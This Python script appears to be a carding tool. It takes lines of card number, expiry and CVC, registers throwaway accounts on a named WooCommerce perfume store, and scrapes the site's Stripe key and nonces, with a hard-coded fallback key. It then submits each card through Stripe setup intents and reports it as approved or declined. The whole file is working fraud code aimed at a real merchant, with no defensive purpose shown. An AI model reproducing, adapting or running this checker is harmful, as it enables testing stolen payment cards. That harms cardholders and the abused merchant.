import requests
import re
import uuid
import random
import time
from user_agent import generate_user_agent

def Stripe1(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3].strip()
    if "20" in yy:
        yy = yy.split("20")[1]

    link = "https://www.french-avenue-parfum.com/en/my-account/add-payment-method/"
    user = generate_user_agent()
    r = requests.Session()
    headers = {'user-agent': user}
    
    res = r.get(url=f"{link}/my-account/", headers=headers).text
    if "woocommerce-register-nonce" not in res:
        res = r.get(url=f"{link}", headers=headers).text
    
    reg2 = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', res)
    if reg2:
        reg = reg2.group(1)
    else:
        reg = None
    
    if reg:
        username = f'u_{uuid.uuid4().hex[:8]}'
        email = f'u_{uuid.uuid4().hex[:8]}@gmail.com'
        password = f'P_{uuid.uuid4().hex[:8]}!'
        data = {'username': username, 'email': email, 'password': password, 'woocommerce-register-nonce': reg, 'register': 'Register'}
        r.post(url=f"{link}/my-account/", headers=headers, data=data)
    
    res3 = r.get(url=f"{link}/my-account/add-payment-method/", headers=headers).text
    
    pk_live2 = re.search(r'(pk_live_[A-Za-z0-9_-]{30,})', res3)
    if pk_live2:
        pk_live = pk_live2.group(1)
    else:
        pk_live = "pk_live_51GoArHLSAGbWSLyrmKHIkbHzoL0ltuHy9Kg8x0UmJkbkaS71B8EpySimSbZR8z4z9EEXBoWvodbX3CXo5AN6OM8500Fe8jCSV4"
        if not pk_live:
            return 'No Stripe key found ⚠️'

    acct2 = re.search(r'(acct_[A-Za-z0-9_-]+)', res3)
    if acct2:
        acct = f'&_stripe_account={acct2.group(1)}'
    else:
        acct = ''                
    addnonce2 = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', res3)
    addnonce3 = re.search(r'"createSetupIntentNonce":"(.*?)"', res3)
    if addnonce2:
        addnonce = addnonce2.group(1)
    elif addnonce3:
        addnonce = addnonce3.group(1)
    else:
        addnonce = None
        
    headers2 = {'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': user}

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent&key={pk_live}{acct}'
    
    res4 = r.post('https://api.stripe.com/v1/payment_methods', data=data, headers=headers2).json()
    if 'id' in res4:
        payment_id = res4['id']
    else:
        return 'There is no option to add the Visa card details, or there is a problem with the website ⚠️'
    
    if addnonce:
        final_headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': f'{link}/my-account/add-payment-method/', 'Origin': f'{link}', 'user-agent': user}

        data = {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_id, 'wc-stripe-payment-type': 'card', '_ajax_nonce': addnonce}

        r5r = r.post(f'{link}/wp-admin/admin-ajax.php', data=data, headers=final_headers)
        r5 = r5r.text
        if 'Your card was declined.' in r5 or 'Your card could not be set up for future usage.' in r5:
            return 'Your card was declined.'
        elif 'success' in r5 or 'Success' in r5:
            return 'Approved ✅'
        elif 'Your card number is incorrect.' in r5:
            return 'Your card number is incorrect.'
        elif 'duplicate' in r5.lower():
            return 'Approved (Duplicate) ✅'
        else:
            try:
                return r5r.json()['data']['error']['message']
            except:
                return r5
    else:
        return 'Payment method created (confirm not available)'